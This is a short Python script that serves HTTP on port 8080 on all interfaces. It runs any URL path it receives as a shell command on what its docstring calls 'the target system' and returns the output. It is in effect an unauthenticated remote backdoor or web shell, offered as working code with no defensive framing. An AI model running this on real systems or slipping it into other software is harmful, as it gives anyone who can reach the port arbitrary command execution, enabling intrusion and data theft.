from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote
import subprocess


BIND_HOST = "0.0.0.0"
PORT = 8080


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Get the command as an argument, execute the command 
        on the target system and send back the command's output.
        """
        cmd = unquote(self.path[1:])
        result = subprocess.check_output(cmd, shell=True, text=True)
        output = f"$ {cmd}\n{result}"
        self.write_response(str.encode(output))

    def write_response(self, content):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)

print(f"Listening on http://{BIND_HOST}:{PORT}\n")

httpd = HTTPServer((BIND_HOST, PORT), SimpleHTTPRequestHandler)
httpd.serve_forever()
